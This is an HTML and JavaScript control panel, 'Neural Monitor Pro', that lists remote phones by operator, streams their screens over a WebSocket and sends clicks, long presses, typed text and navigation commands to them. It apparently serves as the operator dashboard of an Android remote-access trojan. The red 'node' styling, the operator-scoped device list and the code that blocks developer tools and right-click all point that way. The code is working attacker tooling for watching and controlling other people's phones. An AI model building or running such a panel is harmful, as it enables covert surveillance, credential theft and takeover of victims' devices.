<!DOCTYPE html>
<html lang="en">
<head>
    <script src="../protect.js"></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TESVRIX • NEURAL MONITOR PRO</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Plus+Jakarta+Sans:wght@400;600;800&family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        :root {
            --blood: #dc0f0f;
            --blood-glow: rgba(220, 15, 15, 0.4);
            --bg: #000;
            --surface: #0a0a0a;
            --border: rgba(220, 15, 15, 0.25);
            --neon-green: #00ff88;
        }

        body {
            background: var(--bg);
            color: #fff;
            font-family: 'Plus Jakarta Sans', sans-serif;
            height: 100vh;
            overflow: hidden;
            user-select: none;
        }

        .main-wrapper {
            display: flex;
            flex-direction: column;
            height: 100vh;
            padding: 8px;
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 8px 16px;
            background: rgba(10, 10, 10, 0.95);
            border: 1px solid var(--border);
            border-radius: 10px;
            margin-bottom: 8px;
            backdrop-filter: blur(10px);
            flex-wrap: wrap;
            gap: 5px;
        }

        .header h2 {
            font-family: 'Orbitron', sans-serif;
            font-size: 0.6rem;
            letter-spacing: 3px;
            color: var(--blood);
            text-shadow: 0 0 10px var(--blood-glow);
        }

        .content-area {
            flex: 1;
            display: flex;
            gap: 10px;
            overflow: hidden;
            min-height: 0;
        }

        .viewer-section {
            flex: 1;
            display: flex;
            flex-direction: column;
            position: relative;
            min-width: 0;
        }

        .viewer-box {
            flex: 1;
            background: #000;
            border: 2px solid var(--blood);
            border-radius: 16px;
            position: relative;
            width: 100%;
            overflow: hidden;
            box-shadow: 0 0 30px var(--blood-glow);
            aspect-ratio: 9/16;
            max-height: 80vh;
        }

        #screenCanvas {
            width: 100%;
            height: 100%;
            object-fit: contain;
            opacity: 0.95;
            display: block;
            background: #000;
        }
        
        #vncLayer {
            position: absolute;
            top: 0; left: 0;
            width: 100%;
            height: 100%;
            z-index: 5;
            pointer-events: none;
        }
        #vncLayer .vnc-node {
            pointer-events: auto;
        }

        .vnc-node {
            position: absolute;
            border: 1.5px solid rgba(220, 15, 15, 0.3);
            background: rgba(220, 15, 15, 0.06);
            color: rgba(255,255,255,0.7);
            font-size: 6px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            border-radius: 3px;
            transition: all 0.12s ease;
            font-weight: 600;
            min-width: 10px;
            min-height: 10px;
            padding: 1px;
            z-index: 5;
        }
        .vnc-node:hover {
            background: rgba(220, 15, 15, 0.2);
            border-color: #fff;
            transform: scale(1.08);
            z-index: 10;
        }
        .vnc-node:active {
            transform: scale(0.92);
        }
        .vnc-node[data-cat="app"] { border-color: rgba(0,255,136,0.3); background: rgba(0,255,136,0.04); }
        .vnc-node[data-cat="app"]:hover { border-color: var(--neon-green); background: rgba(0,255,136,0.1); }
        .vnc-node[data-cat="button"] { border-color: rgba(255,170,0,0.3); background: rgba(255,170,0,0.04); }
        .vnc-node[data-cat="button"]:hover { border-color: #ffaa00; background: rgba(255,170,0,0.1); }
        .vnc-node[data-cat="text"] { border-color: rgba(0,212,255,0.3); background: rgba(0,212,255,0.04); }

        .keyboard-panel {
            width: 280px;
            background: rgba(10, 10, 10, 0.95);
            border: 1px solid var(--border);
            border-radius: 16px;
            padding: 10px;
            display: flex;
            flex-direction: column;
            gap: 6px;
            overflow-y: auto;
        }

        .panel-title {
            font-family: 'Orbitron', sans-serif;
            font-size: 0.5rem;
            color: #555;
            letter-spacing: 3px;
            text-align: center;
            border-bottom: 1px solid rgba(255,255,255,0.05);
            padding-bottom: 6px;
            margin-bottom: 2px;
        }

        .keyboard-row {
            display: flex;
            justify-content: center;
            gap: 3px;
        }

        .key {
            background: #151515;
            color: #eee;
            border: 1px solid #222;
            padding: 6px 0;
            flex: 1;
            border-radius: 5px;
            text-align: center;
            font-size: 0.65rem;
            font-weight: 700;
            cursor: pointer;
            transition: 0.12s;
            min-height: 28px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .key:hover { 
            background: var(--blood); 
            border-color: #fff; 
            transform: translateY(-2px);
        }
        .key:active { transform: scale(0.95); }
        .key.num-key { color: var(--blood); }
        .key.num-key:hover { color: #fff; }
        .key.wide { flex: 1.8; }
        .key.action-key { 
            background: #050505; 
            border-color: var(--blood); 
            color: #fff;
        }
        .key.action-key:hover { background: var(--blood); }

        .hud-overlay {
            position: absolute;
            top: 8px; right: 8px;
            display: flex; flex-direction: column; gap: 3px; z-index: 100;
        }
        .hud-item {
            background: rgba(0, 0, 0, 0.85);
            border: 1px solid rgba(220, 15, 15, 0.2);
            padding: 2px 8px; border-radius: 3px;
            font-family: 'Share Tech Mono', monospace; font-size: 7px;
            color: #fff; display: flex; align-items: center; gap: 4px;
        }
        .hud-val { color: var(--blood); font-weight: 800; }

        .loader-overlay {
            position: absolute; inset: 0;
            display: none; flex-direction: column; align-items: center; justify-content: center;
            background: rgba(0,0,0,0.9); z-index: 200;
        }
        .loader-overlay.active { display: flex; }
        .spinner { 
            width: 25px; height: 25px; 
            border: 2px solid rgba(220, 15, 15, 0.1); 
            border-top: 2px solid var(--blood); 
            border-radius: 50%; 
            animation: spin 1s linear infinite; 
        }
        @keyframes spin { 100% { transform: rotate(360deg); } }

        .floating-nav {
            position: absolute;
            bottom: 12px; left: 12px;
            display: flex; flex-direction: column; gap: 6px;
            background: rgba(10, 10, 10, 0.9);
            border: 1px solid var(--border);
            padding: 8px; border-radius: 20px;
            z-index: 1500;
        }
        .nav-pill-btn {
            width: 30px; height: 30px; border-radius: 50%;
            background: #111; border: 1px solid #222; color: #888;
            display: flex; align-items: center; justify-content: center;
            cursor: pointer; transition: 0.3s;
            font-size: 12px;
        }
        .nav-pill-btn:hover { border-color: var(--blood); color: #fff; background: var(--blood); }

        .side-actions {
            position: fixed; right: 10px; bottom: 20px;
            display: flex; flex-direction: column; gap: 8px; z-index: 1000;
        }
        .action-circle {
            width: 35px; height: 35px; border-radius: 50%;
            background: rgba(10,10,10,0.95); border: 1px solid var(--border);
            display: flex; align-items: center; justify-content: center;
            cursor: pointer; transition: 0.3s; color: #666;
            font-size: 13px;
        }
        .action-circle:hover { border-color: var(--blood); color: #fff; transform: scale(1.1); }
        .action-circle.active { 
            background: var(--blood); 
            color: #fff;
            box-shadow: 0 0 30px var(--blood-glow);
        }

        #vncStatus {
            text-align: center;
            font-size: 0.55rem;
            color: #555;
            font-family: 'Share Tech Mono', monospace;
            padding: 4px;
            border-top: 1px solid rgba(255,255,255,0.05);
            margin-top: 4px;
        }
        #vncStatus.online { color: var(--neon-green); }
        #vncStatus.offline { color: #ff4444; }

        #deviceList {
            background: #000;
            color: #fff;
            border: 1px solid var(--border);
            padding: 3px 10px;
            border-radius: 6px;
            font-size: 0.55rem;
            outline: none;
            max-width: 130px;
            font-family: 'Share Tech Mono', monospace;
        }

        #connectionIndicator {
            font-size: 0.55rem;
            display: flex;
            align-items: center;
            gap: 4px;
        }
        #connectionIndicator.online { color: var(--neon-green); }
        #connectionIndicator.offline { color: #ff4444; }

        .click-effect {
            position: fixed;
            pointer-events: none;
            z-index: 9999;
            width: 25px;
            height: 25px;
            border-radius: 50%;
            background: radial-gradient(circle, rgba(220,15,15,0.9), rgba(220,15,15,0) 70%);
            transform: translate(-50%, -50%) scale(0);
            animation: clickRipple 0.5s ease-out forwards;
        }
        .click-effect::after {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 3px;
            height: 3px;
            background: #fff;
            border-radius: 50%;
        }
        @keyframes clickRipple {
            0% { transform: translate(-50%, -50%) scale(0); opacity: 1; }
            100% { transform: translate(-50%, -50%) scale(2.5); opacity: 0; }
        }

        @media (max-width: 900px) {
            .content-area { flex-direction: column; }
            .keyboard-panel { width: 100%; height: auto; max-height: 45vh; }
            .viewer-box { max-height: 50vh; aspect-ratio: 9/16; }
        }

        @media (max-width: 480px) {
            .main-wrapper { padding: 4px; }
            .header { padding: 4px 8px; }
            .key { font-size: 0.5rem; padding: 3px 0; min-height: 20px; }
            .keyboard-panel { padding: 4px; gap: 3px; }
            .vnc-node { font-size: 5px; min-width: 8px; min-height: 8px; }
        }

        ::-webkit-scrollbar { width: 3px; }
        ::-webkit-scrollbar-track { background: #000; }
        ::-webkit-scrollbar-thumb { background: var(--blood); border-radius: 10px; }
    </style>
</head>
<body>

    <div class="main-wrapper">
        <div class="header">
            <h2><i class="fas fa-satellite-dish"></i> NEURAL MONITOR PRO</h2>
            <select id="deviceList"></select>
            <span id="connectionIndicator" class="offline">
                <i class="fas fa-circle"></i> OFFLINE
            </span>
        </div>

        <div class="content-area">
            <div class="viewer-section">
                <div class="viewer-box" id="viewerBox">
                    <div class="hud-overlay">
                        <div class="hud-item"><i class="fas fa-battery-three-quarters"></i> BAT: <span class="hud-val" id="hudBat">--%</span></div>
                        <div class="hud-item"><i class="fas fa-cubes"></i> APP: <span class="hud-val" id="hudApp">N/A</span></div>
                        <div class="hud-item"><i class="fas fa-wifi"></i> <span class="hud-val" id="hudSignal">--</span></div>
                    </div>
                    <div class="screen-content" style="width:100%;height:100%;position:relative;">
                        <div class="loader-overlay" id="loader"><div class="spinner"></div></div>
                        <canvas id="screenCanvas"></canvas>
                        <div id="vncLayer"></div>
                    </div>

                    <div class="floating-nav">
                        <div class="nav-pill-btn" onclick="sendCommand('/vnc_back')"><i class="fas fa-chevron-left"></i></div>
                        <div class="nav-pill-btn" onclick="sendCommand('/vnc_home')"><i class="fas fa-home"></i></div>
                        <div class="nav-pill-btn" onclick="sendCommand('/vnc_recents')"><i class="fas fa-window-restore"></i></div>
                    </div>
                </div>
            </div>

            <div class="keyboard-panel">
                <div class="panel-title">⌨️ KEYBOARD</div>

                <div class="keyboard-row">
                    <div class="key num-key" onclick="typeKey('1')">1</div>
                    <div class="key num-key" onclick="typeKey('2')">2</div>
                    <div class="key num-key" onclick="typeKey('3')">3</div>
                    <div class="key num-key" onclick="typeKey('4')">4</div>
                    <div class="key num-key" onclick="typeKey('5')">5</div>
                    <div class="key num-key" onclick="typeKey('6')">6</div>
                    <div class="key num-key" onclick="typeKey('7')">7</div>
                    <div class="key num-key" onclick="typeKey('8')">8</div>
                    <div class="key num-key" onclick="typeKey('9')">9</div>
                    <div class="key num-key" onclick="typeKey('0')">0</div>
                </div>

                <div class="keyboard-row">
                    <div class="key" onclick="typeKey('q')">Q</div>
                    <div class="key" onclick="typeKey('w')">W</div>
                    <div class="key" onclick="typeKey('e')">E</div>
                    <div class="key" onclick="typeKey('r')">R</div>
                    <div class="key" onclick="typeKey('t')">T</div>
                    <div class="key" onclick="typeKey('y')">Y</div>
                    <div class="key" onclick="typeKey('u')">U</div>
                    <div class="key" onclick="typeKey('i')">I</div>
                    <div class="key" onclick="typeKey('o')">O</div>
                    <div class="key" onclick="typeKey('p')">P</div>
                </div>

                <div class="keyboard-row">
                    <div class="key" onclick="typeKey('a')">A</div>
                    <div class="key" onclick="typeKey('s')">S</div>
                    <div class="key" onclick="typeKey('d')">D</div>
                    <div class="key" onclick="typeKey('f')">F</div>
                    <div class="key" onclick="typeKey('g')">G</div>
                    <div class="key" onclick="typeKey('h')">H</div>
                    <div class="key" onclick="typeKey('j')">J</div>
                    <div class="key" onclick="typeKey('k')">K</div>
                    <div class="key" onclick="typeKey('l')">L</div>
                </div>

                <div class="keyboard-row">
                    <div class="key" onclick="typeKey('z')">Z</div>
                    <div class="key" onclick="typeKey('x')">X</div>
                    <div class="key" onclick="typeKey('c')">C</div>
                    <div class="key" onclick="typeKey('v')">V</div>
                    <div class="key" onclick="typeKey('b')">B</div>
                    <div class="key" onclick="typeKey('n')">N</div>
                    <div class="key" onclick="typeKey('m')">M</div>
                </div>

                <div class="keyboard-row">
                    <div class="key" onclick="typeKey('@')">@</div>
                    <div class="key" onclick="typeKey('.')">.</div>
                    <div class="key" onclick="typeKey(',')">,</div>
                    <div class="key" onclick="typeKey('/')">/</div>
                    <div class="key" onclick="typeKey('!')">!</div>
                    <div class="key" onclick="typeKey('?')">?</div>
                    <div class="key" onclick="typeKey('#')">#</div>
                </div>

                <div class="keyboard-row">
                    <div class="key action-key" onclick="typeKey('BACKSPACE')"><i class="fas fa-backspace"></i></div>
                    <div class="key action-key wide" onclick="typeKey(' ')">SPACE</div>
                    <div class="key action-key wide" onclick="sendFullText()" style="background: var(--blood); color: #fff;">SEND</div>
                </div>

                <div id="vncStatus" class="offline">⬤ OFFLINE</div>
            </div>
        </div>
    </div>

    <div class="side-actions">
        <div class="action-circle" id="btnPower" title="Power Toggle"><i class="fas fa-power-off"></i></div>
        <div class="action-circle" onclick="sendCommand('/vnc_scroll', {dir: 'up'})"><i class="fas fa-arrow-up"></i></div>
        <div class="action-circle" onclick="sendCommand('/vnc_scroll', {dir: 'down'})"><i class="fas fa-arrow-down"></i></div>
        <div class="action-circle" onclick="sendCommand('/vnc_start')"><i class="fas fa-sync-alt"></i></div>
    </div>

    <!-- ✅ YOUR ORIGINAL CONFIG.PHP - NO CHANGES NEEDED -->
    <script src="../davidkewebsitekemake300kespeedma/config.php"></script>
    
    <script>
        // ==================== ANTI-INSPECT ====================
        (function() {
            document.addEventListener('keydown', function(e) {
                if (e.keyCode === 123 || 
                    (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) ||
                    (e.ctrlKey && e.keyCode === 85)) {
                    e.preventDefault();
                    return false;
                }
                return true;
            }, true);
            document.addEventListener('contextmenu', e => e.preventDefault());
        })();

        // ==================== CLICK EFFECT ====================
        function showClickEffect(x, y) {
            const el = document.createElement('div');
            el.className = 'click-effect';
            el.style.left = x + 'px';
            el.style.top = y + 'px';
            document.body.appendChild(el);
            setTimeout(() => el.remove(), 500);
        }

        // ==================== MAIN APP ====================
        const auth = JSON.parse(localStorage.getItem('user') || '{}');
        const canvas = document.getElementById('screenCanvas');
        const ctx = canvas.getContext('2d');
        const vncLayer = document.getElementById('vncLayer');
        const loader = document.getElementById('loader');
        const statusText = document.getElementById('vncStatus');
        const connectionIndicator = document.getElementById('connectionIndicator');
        const btnPower = document.getElementById('btnPower');

        let targetUuid = null, ws = null;
        let isActive = false;
        let typingBuffer = "";
        let lastPacketTime = Date.now();

        // ==================== PHYSICAL KEYBOARD ====================
        document.addEventListener('keydown', function(e) {
            if (e.keyCode === 123 || 
                (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) ||
                (e.ctrlKey && e.keyCode === 85)) {
                e.preventDefault();
                return false;
            }

            if (!isActive || document.activeElement.tagName === 'INPUT' || document.activeElement.tagName === 'TEXTAREA') return;
            if (e.key.length === 1) sendCommand('/vnc_type', { text: e.key });
            else if (e.key === 'Backspace') sendCommand('/vnc_type', { text: 'BACKSPACE' });
            else if (e.key === 'Enter') sendCommand('/vnc_type', { text: '\n' });
        }, false);

        // ==================== DEVICES ====================
        async function fetchDevices() {
            try {
                const r = await fetch(getApiUrl(`devices?operator_id=eq.${auth.operator_id}&order=last_seen.desc`), { 
                    headers: getApiHeaders() 
                });
                const data = await r.json();
                const sel = document.getElementById('deviceList');
                sel.innerHTML = data.map(d => 
                    `<option value="${d.device_uuid}">${d.device_name || 'NODE-' + d.device_uuid.slice(0,6)}</option>`
                ).join('');
                if (data[0]) {
                    targetUuid = data[0].device_uuid;
                }
            } catch (e) {
                console.log('API Error - Check config.php');
            }
        }

        // ==================== COMMANDS ====================
        async function sendCommand(type, data = {}) {
            if (!targetUuid || !isActive) return;
            try {
                await fetch(getApiUrl('commands'), { 
                    method: 'POST', 
                    headers: getApiHeaders(), 
                    body: JSON.stringify({ 
                        device_uuid: targetUuid, 
                        type: type, 
                        data: JSON.stringify(data), 
                        operator_id: auth.operator_id, 
                        status: 'pending' 
                    }) 
                });
            } catch (e) {
                console.log('Command failed');
            }
        }

        // ==================== POWER BUTTON ====================
        btnPower.onclick = async () => {
            if (isActive) {
                stopAll();
                return;
            }
            
            isActive = true;
            btnPower.classList.add('active');
            loader.classList.add('active');
            statusText.textContent = '⬤ CONNECTING...';
            connectionIndicator.innerHTML = '<i class="fas fa-circle"></i> CONNECTING';
            
            await sendCommand('/stream_start');
            await sendCommand('/vnc_start');
            initWebSocket();
        };

        // ==================== WEBSOCKET ====================
        function initWebSocket() {
            if (!targetUuid || ws) return;
            
            try {
                ws = new WebSocket(PROXY_URL.replace('http', 'ws') + '/stream?token=' + encodeURIComponent(PROXY_TOKEN));
                ws.binaryType = 'blob';
                
                ws.onopen = () => {
                    ws.send(JSON.stringify({ type: 'dashboard_join', device_uuid: targetUuid, token: PROXY_TOKEN }));
                    statusText.className = 'online';
                    statusText.textContent = '⬤ ONLINE';
                    connectionIndicator.className = 'online';
                    connectionIndicator.innerHTML = '<i class="fas fa-circle"></i> ONLINE';
                    loader.classList.remove('active');
                };
                
                ws.onmessage = (event) => {
                    lastPacketTime = Date.now();
                    if (event.data instanceof Blob) {
                        const url = URL.createObjectURL(event.data);
                        const img = new Image();
                        img.onload = () => {
                            canvas.width = img.width;
                            canvas.height = img.height;
                            ctx.drawImage(img, 0, 0);
                            URL.revokeObjectURL(url);
                            loader.classList.remove('active');
                        };
                        img.onerror = () => URL.revokeObjectURL(url);
                        img.src = url;
                    } else {
                        try {
                            const data = JSON.parse(event.data);
                            if (data.type === 'vnc_hierarchy') {
                                renderVnc(data);
                                if (data.bat) document.getElementById('hudBat').innerText = data.bat + "%";
                                if (data.app) document.getElementById('hudApp').innerText = data.app.split('.').pop().toUpperCase();
                                if (data.signal) document.getElementById('hudSignal').innerText = data.signal;
                            }
                        } catch (e) {}
                    }
                };
                
                ws.onclose = () => {
                    ws = null;
                    if (isActive) {
                        statusText.className = 'offline';
                        statusText.textContent = '⬤ RECONNECTING...';
                        setTimeout(initWebSocket, 3000);
                    }
                };
                
                ws.onerror = () => {
                    if (ws) ws.close();
                };
            } catch (e) {
                setTimeout(initWebSocket, 3000);
            }
        }

        // ==================== RENDER VNC NODES ====================
        function renderVnc(data) {
            const nodes = data.nodes; 
            if (!nodes || nodes.length === 0) return;
            vncLayer.innerHTML = '';
            
            const rect = vncLayer.getBoundingClientRect();
            const phoneW = data.sw || 1080;
            const phoneH = data.sh || 1920;
            
            const containerRatio = rect.width / rect.height;
            const phoneRatio = phoneW / phoneH;
            let renderedW, renderedH, offsetX, offsetY;
            
            if (containerRatio > phoneRatio) {
                renderedH = rect.height;
                renderedW = rect.height * phoneRatio;
                offsetY = 0;
                offsetX = (rect.width - renderedW) / 2;
            } else {
                renderedW = rect.width;
                renderedH = rect.width / phoneRatio;
                offsetX = 0;
                offsetY = (rect.height - renderedH) / 2;
            }
            
            const scaleX = renderedW / phoneW;
            const scaleY = renderedH / phoneH;
            
            nodes.forEach(node => {
                const el = document.createElement('div');
                el.className = 'vnc-node';
                el.style.left = (offsetX + (node.x * scaleX)) + 'px';
                el.style.top = (offsetY + (node.y * scaleY)) + 'px';
                el.style.width = Math.max(node.w * scaleX, 12) + 'px';
                el.style.height = Math.max(node.h * scaleY, 12) + 'px';
                el.innerText = node.t || '';
                el.dataset.cat = node.cat || 'static';
                
                el.onclick = (e) => {
                    e.stopPropagation();
                    
                    const rect2 = vncLayer.getBoundingClientRect();
                    const clickX = rect2.left + (offsetX + (node.x + node.w/2) * scaleX);
                    const clickY = rect2.top + (offsetY + (node.y + node.h/2) * scaleY);
                    showClickEffect(clickX, clickY);
                    
                    sendCommand('/vnc_click', { 
                        x: Math.round(node.x + (node.w / 2)), 
                        y: Math.round(node.y + (node.h / 2)) 
                    });
                    
                    el.style.background = 'rgba(220, 15, 15, 0.3)';
                    el.style.transform = 'scale(0.9)';
                    setTimeout(() => {
                        el.style.background = '';
                        el.style.transform = '';
                    }, 150);
                };
                
                el.oncontextmenu = (e) => {
                    e.preventDefault();
                    sendCommand('/vnc_long_press', { 
                        x: Math.round(node.x + (node.w / 2)), 
                        y: Math.round(node.y + (node.h / 2)) 
                    });
                    el.style.background = 'rgba(59, 130, 246, 0.3)';
                    el.style.transform = 'scale(0.9)';
                    setTimeout(() => {
                        el.style.background = '';
                        el.style.transform = '';
                    }, 400);
                };
                
                vncLayer.appendChild(el);
            });
        }

        // ==================== KEYBOARD FUNCTIONS ====================
        function typeKey(key) {
            if (key === 'BACKSPACE') {
                typingBuffer = typingBuffer.slice(0, -1);
            } else if (key === ' ') {
                typingBuffer += ' ';
            } else {
                typingBuffer += key;
            }
            statusText.textContent = '⬤ TYPING: ' + typingBuffer;
        }

        function sendFullText() {
            if (!typingBuffer) return;
            sendCommand('/vnc_type', { text: typingBuffer });
            typingBuffer = "";
            statusText.textContent = '⬤ SENT';
            setTimeout(() => {
                if (isActive) {
                    statusText.className = 'online';
                    statusText.textContent = '⬤ ONLINE';
                }
            }, 1000);
        }

        // ==================== STOP ALL ====================
        function stopAll() {
            if (ws) {
                ws.close();
                ws = null;
            }
            isActive = false;
            btnPower.classList.remove('active');
            statusText.className = 'offline';
            statusText.textContent = '⬤ OFFLINE';
            connectionIndicator.className = 'offline';
            connectionIndicator.innerHTML = '<i class="fas fa-circle"></i> OFFLINE';
            vncLayer.innerHTML = '';
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            loader.classList.remove('active');
            sendCommand('/stream_stop');
            sendCommand('/vnc_stop');
        }

        // ==================== AUTO-RECONNECT ====================
        setInterval(() => {
            if (isActive && targetUuid && Date.now() - lastPacketTime > 15000) {
                sendCommand('/vnc_start');
            }
        }, 10000);

        // ==================== ROUNDRECT ====================
        if (!CanvasRenderingContext2D.prototype.roundRect) {
            CanvasRenderingContext2D.prototype.roundRect = function(x, y, w, h, r) {
                if (r > w/2) r = w/2;
                if (r > h/2) r = h/2;
                this.moveTo(x + r, y);
                this.arcTo(x + w, y, x + w, y + h, r);
                this.arcTo(x + w, y + h, x, y + h, r);
                this.arcTo(x, y + h, x, y, r);
                this.arcTo(x, y, x + w, y, r);
                return this;
            };
        }

        // ==================== INIT ====================
        fetchDevices();
    </script>
</body>
</html>
